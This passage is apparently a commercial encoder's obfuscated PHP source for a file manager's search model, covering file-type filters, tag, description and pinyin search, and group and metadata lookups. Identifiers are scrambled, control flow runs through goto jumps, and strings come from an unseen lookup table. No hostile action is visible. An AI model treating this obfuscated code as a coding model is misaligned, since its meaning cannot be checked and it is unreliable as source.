isset($c™ºÕ’ã∆”[$FÆÿü‹∫î…[2164]]) ? $c™ºÕ’ã∆”[$FÆÿü‹∫î…[2164]] : !1; goto eåﬁÉÕü‹ã; eåﬁÉÕü‹ã: $Eƒ⁄√≠˜‹Ø = str_replace($FÆÿü‹∫î…[2165], $FÆÿü‹∫î…[2166], trim($Eƒ⁄√≠˜‹Ø)); $b§çËÍÑ§Î = array($FÆÿü‹∫î…[28] => array($FÆÿü‹∫î…[754], "\x25{$Eƒ⁄√≠˜‹Ø}\x25"), $FÆÿü‹∫î…[289] => array($FÆÿü‹∫î…[754], "\45{$Eƒ⁄√≠˜‹Ø}\45"), $FÆÿü‹∫î…[2314] => array($FÆÿü‹∫î…[754], "\45{$Eƒ⁄√≠˜‹Ø}\45"), $FÆÿü‹∫î…[918] => $FÆÿü‹∫î…[2167]); if (Input::check($Eƒ⁄√≠˜‹Ø, $FÆÿü‹∫î…[295])) { $b§çËÍÑ§Î[$FÆÿü‹∫î…[1424]] = array($FÆÿü‹∫î…[754], "\x25{$Eƒ⁄√≠˜‹Ø}\x25"); $b§çËÍÑ§Î[$FÆÿü‹∫î…[2493]] = array($FÆÿü‹∫î…[754], "\45{$Eƒ⁄√≠˜‹Ø}\45"); } goto eûŸÓ˜‰˘É; eûñÏ‹ÍóŒ: } private function _filterByGroup(&$C≈á“è‡¿±, $Fö≤•äΩËø) { $BÌó¡≤úÒ≤ =& $_SERVER[¯èãÄπµ]; if (!$Fö≤•äΩËø) { return $C≈á“è‡¿±; } foreach ($C≈á“è‡¿±[$BÌó¡≤úÒ≤[350]] as $DŒË·ΩØ–É => &$d‰±Û–¯îì) { $dÖ∂Ö√≤™∏ = array_to_keyvalue($d‰±Û–¯îì[$BÌó¡≤úÒ≤[2514]], $BÌó¡≤úÒ≤[33], $BÌó¡≤úÒ≤[2087]); if (!in_array($Fö≤•äΩËø, $dÖ∂Ö√≤™∏)) { unset($C≈á“è‡¿±[$BÌó¡≤úÒ≤[350]][$DŒË·ΩØ–É]); } } $C≈á“è‡¿±[$BÌó¡≤úÒ≤[350]] = array_values($C≈á“è‡¿±[$BÌó¡≤úÒ≤[350]]); $C≈á“è‡¿±[$BÌó¡≤úÒ≤[347]] = array($BÌó¡≤úÒ≤[2290] => count($C≈á“è‡¿±[$BÌó¡≤úÒ≤[350]]), $BÌó¡≤úÒ≤[2288] => $C≈á“è‡¿±[$BÌó¡≤úÒ≤[347]][$BÌó¡≤úÒ≤[345]], $BÌó¡≤úÒ≤[2287] => 1, $BÌó¡≤úÒ≤[2289] => 1); } private function _searchFromMeta($Aó†Ò∂É’≈, $AçãÑ⁄ä…©, $EúÈö¶ÔÓè) { goto F€ΩìôÕ∞É; A‚ñ´Î√©Â: $e˜ßõÌ⁄ïŸ = $this->where(array($c⁄òçã®••[1415] => array($c⁄òçã®••[7], $a£Ÿ”¬ﬁ’È)))->select(); if (!$e˜ßõÌ⁄ïŸ) { return array(); } return $e˜ßõÌ⁄ïŸ; goto A≈ÁÍ‡∫Ó•; F·ÏòØÙë¯: $a£Ÿ”¬ﬁ’È = Model($c⁄òçã®••[2515])->where($e‘‘øêΩ–≈)->limit($EúÈö¶ÔÓè)->select(); if (!$a£Ÿ”¬ﬁ’È) { return array(); } $a£Ÿ”¬ﬁ’È = array_to_keyvalue($a£Ÿ”¬ﬁ’È, $c⁄òçã®••[33], $c⁄òçã®••[1424]); goto A‚ñ´Î√©Â; F€ΩìôÕ∞É: $c⁄òçã®•• =& $_SERVER[¯èãÄπµ]; $AçãÑ⁄ä…© = strtolower($AçãÑ⁄ä…©); $e‘‘øêΩ–≈ = array($c⁄òçã®••[89] => $Aó†Ò∂É’≈, $c⁄òçã®••[355] => array($c⁄òçã®••[754], "\45{$AçãÑ⁄ä…©}\x25")); goto F·ÏòØÙë¯; A≈ÁÍ‡∫Ó•: } private function _listDataApplyItem($déÛ†ê¿“Ë) { $BóÀ›ò†éò = array($déÛ†ê¿“Ë); $this->_listDataApply($BóÀ›ò†éò); return $BóÀ›ò†éò[0]; } private function _listDataApply(&$bí òë¶”ã) { goto fÓ¬∑ß–≠ù; fÓ¬∑ß–≠ù: $f»ìﬂëÑÈæ =& $_SERVER[¯èãÄπµ]; if (!$bí òë¶”ã) { return; } array_remove_key($bí òë¶”ã, $f»ìﬂëÑÈæ[806]); goto dÖæÌ¿ß—ë; dÖæÌ¿ß—ë: $CÊ©«¬´ˆ‰ = array_to_keyvalue($bí òë¶”ã, $f»ìﬂëÑÈæ[33], $f»ìﬂëÑÈæ[1424]); $this->_listAppendGroup($bí òë¶”ã, $CÊ©«¬´ˆ‰); $this->_listAppendMeta($bí òë¶”ã, $CÊ©«¬´ˆ‰); goto eªûçÛòπ¶; eªûçÛòπ¶: $this->_listAppendSourceRoot($bí òë¶”ã, $CÊ©«¬´ˆ‰); goto dé≤¯õ™îÂ; dé≤¯õ™îÂ: } private function _listAppendSourceRoot(&$AÃáÀÃÂí⁄, $eÇé¿ëƒÿî) { goto B®ã∆ãîå∞; CΩ∂Æºà˜è: $c◊ÌºﬂÏ∑ı = Model($CçÍï’ã‚ü[755])->order($CçÍï’ã‚ü[2174])->field($bΩ‹°”¯¥™)->where($cç‰œÒ∑Óπ)->select(); $c◊ÌºﬂÏ∑ı = array_to_keyvalue($c◊ÌºﬂÏ∑ı, $CçÍï’ã‚ü[452]); $c◊ÌºﬂÏ∑ı = array_remove_key($c◊ÌºﬂÏ∑ı, $CçÍï’ã‚ü[452]); goto Büµæ≈Õ¿Ω; Büµæ≈Õ¿Ω: foreach ($AÃáÀÃÂí⁄ as &$aâ◊éÙÒ√Â) { $aâ◊éÙÒ√Â[$CçÍï’ã‚ü[387]] = $c◊ÌºﬂÏ∑ı[$aâ◊éÙÒ√Â[$CçÍï’ã‚ü[1424]]] ? $c◊ÌºﬂÏ∑ı[$aâ◊éÙÒ√Â[$CçÍï’ã‚ü[1424]]] : array(); } goto Fàå∏≥ﬁö∑; B®ã∆ãîå∞: $CçÍï’ã‚ü =& $_SERVER[¯èãÄπµ]; $cç‰œÒ∑Óπ = array($CçÍï’ã‚ü[457] => 0, $CçÍï’ã‚ü[367] => SourceModel::TYPE_USER, $CçÍï’ã‚ü[452] => array($CçÍï’ã‚ü[7], $eÇé¿ëƒÿî)); $bΩ‹°”¯¥™ = $CçÍï’ã‚ü[2173]; goto CΩ∂Æºà˜è; Fàå∏≥ﬁö∑: } private function _listAppendGroup(&$E€⁄µ˜∏ÂÙ, $Cêœ‰Ó∑ûı) { goto C∞Éê∏È¥É; C©µı÷Ÿæã: $Aû¢÷Ïç‚Ñ = array($D∏ﬁÖÃ™èü[2087] => array($D∏ﬁÖÃ™èü[7], $a”ê™‰Æ“)); $cç…∫ƒÃµ˜ = Model($D∏ﬁÖÃ™èü[2516])->field($D∏ﬁÖÃ™èü[2517])->where($Aû¢÷Ïç‚Ñ)->select(); $bÿ¥œûÉãô = array_to_keyvalue($cç…∫ƒÃµ˜, $D∏ﬁÖÃ™èü[2087], $D∏ﬁÖÃ™èü[28]); goto c–æ˘‘ëËÊ; f‚ò´∏û º: $a”ê™‰Æ“ = array_to_keyvalue($bÚ≈í˘ºØâ, $D∏ﬁÖÃ™èü[33], $D∏ﬁÖÃ™èü[2087]); $a”ê™‰Æ“ = array_remove_value(array_unique($a”ê™‰Æ“), $D∏ﬁÖÃ™èü[464]); if (!$a”ê™‰Æ“ || !$bÚ≈í˘ºØâ) { return; } goto C©µı÷Ÿæã; C∞Éê∏È¥É: $D∏ﬁÖÃ™èü =& $_SERVER[¯èãÄπµ]; $Aû¢÷Ïç‚Ñ = array($D∏ﬁÖÃ™èü[1424] => array($D∏ﬁÖÃ™èü[7], $Cêœ‰Ó∑ûı)); $bÚ≈í˘ºØâ = Model($D∏ﬁÖÃ™èü[2161])->where($Aû¢÷Ïç‚Ñ)->select(); goto f‚ò´∏û º; c–æ˘‘ëËÊ: $bÚ≈í˘ºØâ = array_to_keyvalue_group($bÚ≈í˘ºØâ, $D∏ﬁÖÃ™èü[1424]); foreach ($bÚ≈í˘ºØâ as &$Dîû—“¶õ±) { $FÎπê€óÀÉ = array(); foreach ($Dîû—“¶õ± as $bâà©îé£ﬁ) { if (!$bâà©îé£ﬁ[$D∏ﬁÖÃ™èü[2215]]) { continue; } $Døì¬€¿ñî = Model($D∏ﬁÖÃ™èü[2234])->listData($bâà©îé£ﬁ[$D∏ﬁÖÃ™èü[2215]]); $FÎπê€óÀÉ[] = array($D∏ﬁÖÃ™èü[2087] => $bâà©îé£ﬁ[$D∏ﬁÖÃ™èü[2087]], $D∏ﬁÖÃ™èü[2518] => $bÿ¥œûÉãô[$bâà©îé£ﬁ[$D∏ﬁÖÃ™èü[2087]]], $D∏ﬁÖÃ™èü[372] => $Døì¬€¿ñî); } $Dîû—“¶õ± = $FÎπê€óÀÉ; } foreach ($E€⁄µ˜∏ÂÙ as &$Bê”ñ°„∂’) { $Bê”ñ°„∂’[$D∏ﬁÖÃ™èü[2514]] = array(); if (isset($bÚ≈í˘ºØâ[$Bê”ñ°„∂’[$D∏ﬁÖÃ™èü[1424]]])) { $Bê”ñ°„∂’[$D∏ﬁÖÃ™èü[2514]] = $bÚ≈í˘ºØâ[$Bê”ñ°„∂’[$D∏ﬁÖÃ™èü[1424]]]; } } goto DãïÖ≤Ü™∆; DãïÖ≤Ü™∆: } private function _listAppendMeta(&$cÑ–Œ´∞ïö, $D†ÇÑÖÿ≈¿) { goto AÚê¶ÌÉµâ; AÚê¶ÌÉµâ: $eÏµêâúΩÑ =& $_SERVER[¯èãÄπµ]; $a∑¿”üôü≤ = UserJobModel::JOB_KEY; $c…ÚÎ«çªª = array($eÏµêâúΩÑ[2495]); goto CÜ‘Ì‚€ÆÍ; CÜ‘Ì‚€ÆÍ: $d ±°ÉØËâ = array($eÏµêâúΩÑ[1424] => array($eÏµêâúΩÑ[7], $D†ÇÑÖÿ≈¿)); $CÑáºÏÒ∫ß = Model($eÏµêâúΩÑ[2492])->where($d ±°ÉØËâ)->select(); $CÑáºÏÒ∫ß = array_to_keyvalue_group($CÑáºÏÒ∫ß, $eÏµêâúΩÑ[1424]); goto d˜èô·¨‰≠; d˜èô·¨‰≠: foreach ($CÑáºÏÒ∫ß as &$fΩà±ï”‡ì) { $fÿ•´∫ﬁÑ‡ = array(); foreach ($fΩà±ï”‡ì as $E£∏ü≠ÔåÎ) { if (!in_array($E£∏ü≠ÔåÎ[$eÏµêâúΩÑ[89]], $c…ÚÎ«çªª)) { $fÿ•´∫ﬁÑ‡[$E£∏ü≠ÔåÎ[$eÏµêâúΩÑ[89]]] = $E£∏ü≠ÔåÎ[$eÏµêâúΩÑ[355]]; } } $fΩà±ï”‡ì = $fÿ•´∫ﬁÑ‡; } $bîÑ◊¢âÕ‘ = Model($eÏµêâúΩÑ[2519]); foreach ($cÑ–Œ´∞ïö as &$bŒ›íé÷ÑÈ) { $DÜ†àÑÙ˘ = array(); if (isset($CÑáºÏÒ∫ß[$bŒ›íé÷ÑÈ[$eÏµêâúΩÑ[1424]]])) { $DÜ†àÑÙ˘ = $CÑáºÏÒ∫ß[$bŒ›íé÷ÑÈ[$eÏµêâúΩÑ[1424]]]; } $bŒ›íé÷ÑÈ[$eÏµêâúΩÑ[2520]] = array(); if (isset($DÜ†àÑÙ˘[$a∑¿”üôü≤])) { $bŒ›íé÷ÑÈ[$eÏµêâúΩÑ[2520]] = $bîÑ◊¢âÕ‘->getUserJobInfo($DÜ†àÑÙ˘[$a∑¿”üôü≤]); } } goto e›ñöÇÑ—”; e›ñöÇÑ—”: } public function userSearch($a£Á®Ñ®Ûû, $e¶ΩˆÁêﬂè = "\x2a") { return Model($_SERVER[¯èãÄπµ][473])->where($a£Á®Ñ®Ûû)->field($e¶ΩˆÁêﬂè)->find(); } } goto Aã∆ç’êçà; a–«÷ùàíÜ: class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($E√Â’±¥ÿæ) { goto fãÎ‘Ì™Í¶; fãÎ‘Ì™Í¶: $eΩ“˜¢ÏäÉ =& $_SERVER[¯èãÄπµ]; $d€œ˘’°·Á = KodIO::fileTypeList(); $A∏≤∫Â≤÷ï = $d€œ˘’°·Á[$E√Â’±¥ÿæ]; goto c…Â≥ºµúÛ; cﬂà»ñ›â∆: if (!$A∏≤∫Â≤÷ï[$eΩ“˜¢ÏäÉ[156]]) { $c‡ñÉàâŸË = array_to_keyvalue($d€œ˘’°·Á, $eΩ“˜¢ÏäÉ[33], $eΩ“˜¢ÏäÉ[156]); $Eò≈ù£ë«≤ = implode($eΩ“˜¢ÏäÉ[47], $c‡ñÉàâŸË); $BÍˆ›Ã∏ÁÔ = $eΩ“˜¢ÏäÉ[2243]; } $CâäÎÂ›†ú = explode($eΩ“˜¢ÏäÉ[47], trim($Eò≈ù£ë«≤, $eΩ“˜¢ÏäÉ[47])); return array($BÍˆ›Ã∏ÁÔ, $CâäÎÂ›†ú); goto Cöèßπ≈êÑ; c…Â≥ºµúÛ: if (!$A∏≤∫Â≤÷ï) { return array(); } $Eò≈ù£ë«≤ = $A∏≤∫Â≤÷ï[$eΩ“˜¢ÏäÉ[156]]; $BÍˆ›Ã∏ÁÔ = $eΩ“˜¢ÏäÉ[7]; goto cﬂà»ñ›â∆; Cöèßπ≈êÑ: } public function listPathType($E≥…ª°Ó—¯) { $AΩÁû∆å±‘ =& $_SERVER[¯èãÄπµ]; $AãÖõÃÍûí = $this->fileTypeWhere($E≥…ª°Ó—¯); if (!$AãÖõÃÍûí) { return array(); } $BÇÈó©áúı = array($AΩÁû∆å±‘[517] => SourceModel::TYPE_USER, $AΩÁû∆å±‘[518] => USER_ID, $AΩÁû∆å±‘[514] => 0, $AΩÁû∆å±‘[515] => $AãÖõÃÍûí); return $this->listSource($BÇÈó©áúı); } public function listSearch($A¨ö ·ø∑“, $eª¶·µÑﬂõ = 300) { goto dõú⁄∞ÿ≈¨; FÜ£Ó¿∞≈ê: $this->_listMake($aîºäà¬´); return $aîºäà¬´; goto bÕ∫≤ƒâ¬‡; dü¢ì–ã¬ö: if (!isset($FÎÏﬂ…”áﬁ[$Cß∞áîª°é[393]])) { $FÎÏﬂ…”áﬁ[$Cß∞áîª°é[393]] = 0; } $D‘‘¿Èﬂîÿ = $Cß∞áîª°é[2294]; $BéÏ⁄¢Ù‹ = $D‘‘¿Èﬂîÿ; goto BÇÙà„Á⁄ç; A€≈»¯éãÒ: $this->_listSearchDesc($aîºäà¬´, $A¨ö ·ø∑“, $BéÏ⁄¢Ù‹); $this->_listSearchTag($aîºäà¬´, $A¨ö ·ø∑“, $BéÏ⁄¢Ù‹); $this->_listDataApply($aîºäà¬´[$Cß∞áîª°é[350]]); goto FÜ£Ó¿∞≈ê; dõú⁄∞ÿ≈¨: $Cß∞áîª°é =& $_SERVER[¯èãÄπµ]; if (isset($A¨ö ·ø∑“[$Cß∞áîª°é[2163]]) && $A¨ö ·ø∑“[$Cß∞áîª°é[2163]]) { $A¨ö ·ø∑“[$Cß∞áîª°é[2163]] = str_replace($Cß∞áîª°é[1576], $Cß∞áîª°é[2293], trim($A¨ö ·ø∑“[$Cß∞áîª°é[2163]])); } $FÎÏﬂ…”áﬁ = $this->_parseSearchWhere($A¨ö ·ø∑“); goto dü¢ì–ã¬ö; BÇÙà„Á⁄ç: $this->_listSearchBindPinyin($A¨ö ·ø∑“, $FÎÏﬂ…”áﬁ, $D‘‘¿Èﬂîÿ); $this->alias($Cß∞áîª°é[483])->_makeOrder()->cache(null, 10); $aîºäà¬´ = $this->distinct(!0)->field($D‘‘¿Èﬂîÿ)->where($FÎÏﬂ…”áﬁ)->selectPage($eª¶·µÑﬂõ); goto A€≈»¯éãÒ; bÕ∫≤ƒâ¬‡: } private function _listSearchTag(&$EÎ⁄πû˜‘é, $C∆áñ∏¨ÂÕ, $BÛû´ãÖÔ…) { goto c√¶¢¨æŒπ; e≈Øüëçá: if (!$F´É•µß±) { return; } $C“Ç®”Ûãí = array($fïº†¨ú≤€[389] => array($fïº†¨ú≤€[7], $F´É•µß±)); $f’ÜˆªÃìû = Model($fïº†¨ú≤€[390])->field($fïº†¨ú≤€[75])->where($C“Ç®”Ûãí)->select(); goto Bë≥ñëﬁ≤·; c√¶¢¨æŒπ: $fïº†¨ú≤€ =& $_SERVER[¯èãÄπµ]; if (!$C∆áñ∏¨ÂÕ[$fïº†¨ú≤€[2163]] || $EÎ⁄πû˜‘é[$fïº†¨ú≤€[347]][$fïº†¨ú≤€[336]] > 1) { return; } $D‚⁄÷ûÓ…Ü = Model($fïº†¨ú≤€[2295])->listData(); goto C¡Â∑¯Â∏√; Bë≥ñëﬁ≤·: $f’ÜˆªÃìû = array_to_keyvalue($f’ÜˆªÃìû, $fïº†¨ú≤€[33], $fïº†¨ú≤€[75]); $E©¿©—–¡ê = array_unique($f’ÜˆªÃìû); $this->_listSearchMerge($EÎ⁄πû˜‘é, $C∆áñ∏¨ÂÕ, $BÛû´ãÖÔ…, $E©¿©—–¡ê); goto fæ¨Çªã¡ï; C¡Â∑¯Â∏√: $F´É•µß± = array(); $AüÙ∑»Ÿπ™ = $C∆áñ∏¨ÂÕ[$fïº†¨ú≤€[2163]]; foreach ($D‚⁄÷ûÓ…Ü as $DÇ©ã†ªƒ) { $CôÍíéîÚµ = $DÇ©ã†ªƒ[$fïº†¨ú≤€[28]]; $CäæŸŸ«√á = str_replace($fïº†¨ú≤€[50], $fïº†¨ú≤€[33], Pinyin::encode($CôÍíéîÚµ)); if (stripos($CôÍíéîÚµ, $AüÙ∑»Ÿπ™) !== !1 || stripos($CäæŸŸ«√á, $AüÙ∑»Ÿπ™) !== !1) { $F´É•µß±[] = $DÇ©ã†ªƒ[$fïº†¨ú≤€[363]]; } } goto e≈Øüëçá; fæ¨Çªã¡ï: } private function _listSearchDesc(&$Bïı√“–„ü, $fË˘†Í≤†ø, $cæ›Ñ◊…¡¿) { goto Dú¥Ωù“˘Ÿ; D–âıµ˜Üé: $d¯πÜëÇ°ÿ = array_unique($d¯πÜëÇ°ÿ); if (!$d¯πÜëÇ°ÿ) { return; } $F™ÊıæìˆÊ = array($EÔﬁÒ⁄∞•[365] => array($EÔﬁÒ⁄∞•[7], $d¯πÜëÇ°ÿ), $EÔﬁÒ⁄∞•[89] => $EÔﬁÒ⁄∞•[401], $EÔﬁÒ⁄∞•[355] => array($EÔﬁÒ⁄∞•[754], $EÔﬁÒ⁄∞•[2165] . $fË˘†Í≤†ø[$EÔﬁÒ⁄∞•[2163]] . $EÔﬁÒ⁄∞•[2165])); goto FÊø‚ıÇòï; Dú¥Ωù“˘Ÿ: $EÔﬁÒ⁄∞• =& $_SERVER[¯èãÄπµ]; if (!$fË˘†Í≤†ø[$EÔﬁÒ⁄∞•[2163]] || $Bïı√“–„ü[$EÔﬁÒ⁄∞•[347]][$EÔﬁÒ⁄∞•[336]] > 1) { return; } $d¯πÜëÇ°ÿ = $this->listSearchChildren($fË˘†Í≤†ø[$EÔﬁÒ⁄∞•[457]]); goto D–âıµ˜Üé; FÊø‚ıÇòï: $càîﬁæä¥Ÿ = Model($EÔﬁÒ⁄∞•[500])->field($EÔﬁÒ⁄∞•[365])->where($F™ÊıæìˆÊ)->select(); $E©∫ÿÌÕ◊¨ = array_to_keyvalue($càîﬁæä¥Ÿ, $EÔﬁÒ⁄∞•[33], $EÔﬁÒ⁄∞•[365]); $this->_listSearchMerge($Bïı√“–„ü, $fË˘†Í≤†ø, $cæ›Ñ◊…¡¿, $E©∫ÿÌÕ◊¨); goto b⁄ßÌïÀºÛ; b⁄ßÌïÀºÛ: } private function _listSearchMerge(&$fÍ…ûß∞à∞, $B∂Ìñ—ß√À, $BÉ ‡‰ó–ü, $c©ç»ˆÆá£) { goto bÓ„ÓÉ∫Â©; BóÙæıÙ•Ç: foreach ($AﬂÇ∫…ìæÙ as $e§∑◊»‹ú®) { $e•ÃÉÒﬁø∏ = $eòÉŸÉ¥±…[47] . $B∂Ìñ—ß√À[$eòÉŸÉ¥±…[457]] . $eòÉŸÉ¥±…[47]; if (stripos($e§∑◊»‹ú®[$eòÉŸÉ¥±…[455]], $e•ÃÉÒﬁø∏) !== !1) { $cΩËÂ‘ÁÍç[] = $e§∑◊»‹ú®; } } $fÍ…ûß∞à∞[$eòÉŸÉ¥±…[350]] = array_merge($cΩËÂ‘ÁÍç, $fÍ…ûß∞à∞[$eòÉŸÉ¥±…[350]]); $fÍ…ûß∞à∞[$eòÉŸÉ¥±…[347]][$eòÉŸÉ¥±…[348]] += count($cΩËÂ‘ÁÍç); goto bÖåé≠”«¢; bÓ„ÓÉ∫Â©: $eòÉŸÉ¥±… =& $_SERVER[¯èãÄπµ]; if (!$c©ç»ˆÆá£) { return; } $bÚ·àÍ≥îÑ = array_to_keyvalue($fÍ…ûß∞à∞[$eòÉŸÉ¥±…[350]], $eòÉŸÉ¥±…[33], $eòÉŸÉ¥±…[365]); goto aêêΩÙÛòπ; B€éãäŸÉØ: $AﬂÇ∫…ìæÙ = $this->field($BÉ ‡‰ó–ü)->where($e©º”Îê≈ñ)->select(); if (!$AﬂÇ∫…ìæÙ) { return; } $cΩËÂ‘ÁÍç = array(); goto BóÙæıÙ•Ç; aêêΩÙÛòπ: $AºÈ«üò†È = array_diff($c©ç»ˆÆá£, $bÚ·àÍ≥îÑ); if (!$AºÈ«üò†È) { return; } $e©º”Îê≈ñ = array($eòÉŸÉ¥±…[365] => array($eòÉŸÉ¥±…[7], $AºÈ«üò†È)); goto B€éãäŸÉØ; bÖåé≠”«¢: } public function listSearchChildren($AÎ¯öë‡ŒÚ, $DΩ∞ç¡ÏÓ∏ = 5000) { goto Bºô”˘î›¿; Bºô”˘î›¿: $D—∏®⁄ô€˘ =& $_SERVER[¯èãÄπµ]; $f⁄ëà¨è”ó = array(); $dëÉ™ΩÔ∑∂ = $this->sourceInfo($AÎ¯öë‡ŒÚ); goto eÎë≈ﬁ¶¯; BåÁÏ®¯ƒº: $BÿŒÆıüÌ = $this->field($D—∏®⁄ô€˘[365])->where($A∂Ü∫ê⁄‘¯)->select(); $f⁄ëà¨è”ó = array_to_keyvalue($BÿŒÆıüÌ, $D—∏®⁄ô€˘[33], $D—∏®⁄ô€˘[365]); return $f⁄ëà¨è”ó; goto e“ﬁåØÑè¥; eÎë≈ﬁ¶¯: $A∂Ü∫ê⁄‘¯ = array($D—∏®⁄ô€˘[455] => array($D—∏®⁄ô€˘[754], $dëÉ™ΩÔ∑∂[$D—∏®⁄ô€˘[455]] . $dëÉ™ΩÔ∑∂[$D—∏®⁄ô€˘[365]] . $D—∏®⁄ô€˘[480])); $fºûÑëÒÉ¿ = $this->field($D—∏®⁄ô€˘[365])->cache(null, 600)->where($A∂Ü∫ê⁄‘¯)->count(); if ($fºûÑëÒÉ¿ > $DΩ∞ç¡ÏÓ∏) { return $this->_listSearchChildrenNear($AÎ¯öë‡ŒÚ, $DΩ∞ç¡ÏÓ∏); } goto BåÁÏ®¯ƒº; e“ﬁåØÑè¥: } private function _listSearchChildrenNear($Eı˘·ÊœëË, $côﬂî «„Ã) { goto EÈ§€ﬁ”≤Ê; EØ–ˆéΩ°”: $E«å…ì¿¶Ê = array_merge($E«å…ì¿¶Ê, array_to_keyvalue($D·ı®·û†ı, $CˆÉÚúó◊∫[33], $CˆÉÚúó◊∫[365])); $E«å…ì¿¶Ê = array_slice($E«å…ì¿¶Ê, 0, $côﬂî «„Ã); return $E«å…ì¿¶Ê; goto d¥€ﬁåìÈû; EÈ§€ﬁ”≤Ê: $CˆÉÚúó◊∫ =& $_SERVER[¯èãÄπµ]; $E«å…ì¿¶Ê = array(); $b…∫É°¥∏Æ = array($CˆÉÚúó◊∫[457] => $Eı˘·ÊœëË); goto câÌºê’ñõ; CÁï≤¨°ã‘: if (!$E¡ï≥≈§à∂) { return $E«å…ì¿¶Ê; } $b…∫É°¥∏Æ = array($CˆÉÚúó◊∫[457] => array($CˆÉÚúó◊∫[7], $E¡ï≥≈§à∂)); $D·ı®·û†ı = $this->field($CˆÉÚúó◊∫[2296])->where($b…∫É°¥∏Æ)->select(); goto EØ–ˆéΩ°”; câÌºê’ñõ: $D·ı®·û†ı = $this->field($CˆÉÚúó◊∫[2296])->where($b…∫É°¥∏Æ)->select(); $E¡ï≥≈§à∂ = array_to_keyvalue(array_filter_by_field($D·ı®·û†ı, $CˆÉÚúó◊∫[366], $CˆÉÚúó◊∫[83]), $CˆÉÚúó◊∫[33], $CˆÉÚúó◊∫[365]); $E«å…ì¿¶Ê = array_merge($E«å…ì¿¶Ê, array_to_keyvalue($D·ı®·û†ı, $CˆÉÚúó◊∫[33], $CˆÉÚúó◊∫[365])); goto CÁï≤¨°ã‘; d¥€ﬁåìÈû: } private function _listSearchBindPinyin($fÈÁª¿∆ªµ, &$BÈıàÑıÇÆ, &$F¿èœé⁄Æñ) { goto DÕ¡Ã€∆¶ë; Dœ±ï’Ωìµ: $f™ë ≠∫°≠ = array(); $F¿èœé⁄Æñ = str_replace(array($d„ƒåµ§ß…[213], $d„ƒåµ§ß…[50], $d„ƒåµ§ß…[2297]), $d„ƒåµ§ß…[33], $F¿èœé⁄Æñ); $F¿èœé⁄Æñ = $d„ƒåµ§ß…[2298] . str_replace($d„ƒåµ§ß…[47], $d„ƒåµ§ß…[2299], $F¿èœé⁄Æñ); goto bçõù‹„œá; bçõù‹„œá: unset($BÈıàÑıÇÆ[$d„ƒåµ§ß…[28]]); foreach ($BÈıàÑıÇÆ as $Eåééèâã„ => $fË¶∑å≤å∑) { $f™ë ≠∫°≠[$d„ƒåµ§ß…[2298] . $Eåééèâã„] = $fË¶∑å≤å∑; } $E¢ƒçû™µÉ = array($d„ƒåµ§ß…[479], $d„ƒåµ§ß…[2165] . $fÈÁª¿∆ªµ[$d„ƒåµ§ß…[2163]] . $d„ƒåµ§ß…[2165]); goto a≤Ì€ôÈäè; DÕ¡Ã€∆¶ë: $d„ƒåµ§ß… =& $_SERVER[¯èãÄπµ]; if (!Input::check($fÈÁª¿∆ªµ[$d„ƒåµ§ß…[2163]], $d„ƒåµ§ß…[302]) || strlen($fÈÁª¿∆ªµ[$d„ƒåµ§ß…[2163]]) < 2) { return; } $E÷åìê€°Ñ = "\114\x45\106\x54\40\112\x4f\111\116\40{$this->tablePrefix}\x69\157\x5f\163\x6f\x75\162\x63\145\x5f\155\145\x74\x61\x20\x6d\x65\164\x61\40\x6f\x6e\x20\x73\157\165\x72\143\145\x2e\x73\157\165\x72\x63\145\x49\104\x20\x3d\40\155\145\x74\141\56\163\x6f\165\162\143\145\x49\x44"; goto Dœ±ï’Ωìµ; a≤Ì€ôÈäè: $f™ë ≠∫°≠[] = array($d„ƒåµ§ß…[2300] => $E¢ƒçû™µÉ, $d„ƒåµ§ß…[918] => $d„ƒåµ§ß…[2167], array($d„ƒåµ§ß…[2301] => $E¢ƒçû™µÉ, $d„ƒåµ§ß…[2302] => array($d„ƒåµ§ß…[7], array($d„ƒåµ§ß…[412], $d„ƒåµ§ß…[411])))); $this->join($E÷åìê€°Ñ); $BÈıàÑıÇÆ = $f™ë ≠∫°≠; goto b˘Ú⁄õ¯¡à; b˘Ú⁄õ¯¡à: } private function _parseSearchWhere($dÒËé¨àˆ€) { goto c‡™§àÉ«Ö; c‡™§àÉ«Ö: $dó¶îîù¨∑ =& $_SERVER[¯èãÄπµ]; $d¶‰◊›â±É = array(); if (isset($dÒËé¨àˆ€[$dó¶îîù¨∑[705]])) { $d¶‰◊›â±É[$dó¶îîù¨∑[106]] = array($dó¶îîù¨∑[2303], $dÒËé¨àˆ€[$dó¶îîù¨∑[705]]); } goto d§ú°í¶Ú÷; CÕ©¨–ü≥Œ: if (isset($dÒËé¨àˆ€[$dó¶îîù¨∑[531]])) { $d¶‰◊›â±É[] = array($dó¶îîù¨∑[375] => $dÒËé¨àˆ€[$dó¶îîù¨∑[531]], $dó¶îîù¨∑[374] => $dÒËé¨àˆ€[$dó¶îîù¨∑[531]], $dó¶îîù¨∑[918] => $dó¶îîù¨∑[2167]); } if (isset($dÒËé¨àˆ€[$dó¶îîù¨∑[368]])) { $c—É¢å° Ì = $dÒËé¨àˆ€[$dó¶îîù¨∑[368]]; if ($c—É¢å° Ì == $dó¶îîù¨∑[76]) { $d¶‰◊›â±É[$dó¶îîù¨∑[366]] = 1; } else { if ($c—É¢å° Ì == $dó¶îîù¨∑[2308]) { $d¶‰◊›â±É[$dó¶îîù¨∑[366]] = 0; } else { if ($c—É¢å° Ì) { $c—É¢å° Ì = is_array($c—É¢å° Ì) ? $c—É¢å° Ì : explode($dó¶îîù¨∑[47], $c—É¢å° Ì); $d¶‰◊›â±É[$dó¶îîù¨∑[368]] = array($dó¶îîù¨∑[380], $c—É¢å° Ì); $d¶‰◊›â±É[$dó¶îîù¨∑[366]] = 0; } } } } if (isset($dÒËé¨àˆ€[$dó¶îîù¨∑[457]])) { $cÏ—¯÷Â†∆ = $this->sourceInfo($dÒËé¨àˆ€[$dó¶îîù¨∑[457]]); $d¶‰◊›â±É[$dó¶îîù¨∑[521]] = array($dó¶îîù¨∑[479], $cÏ—¯÷Â†∆[$dó¶îîù¨∑[455]] . $dÒËé¨àˆ€[$dó¶îîù¨∑[457]] . $dó¶îîù¨∑[480]); } goto eÏúÜœÒ—Œ; d§ú°í¶Ú÷: if (isset($dÒËé¨àˆ€[$dó¶îîù¨∑[706]])) { $bâÑ˘´Èí≈ = array($dó¶îîù¨∑[2304], $dÒËé¨àˆ€[$dó¶îîù¨∑[706]]); if ($d¶‰◊›â±É[$dó¶îîù¨∑[106]]) { $d¶‰◊›â±É[$dó¶îîù¨∑[106]] = array($d¶‰◊›â±É[$dó¶îîù¨∑[106]], $bâÑ˘´Èí≈, 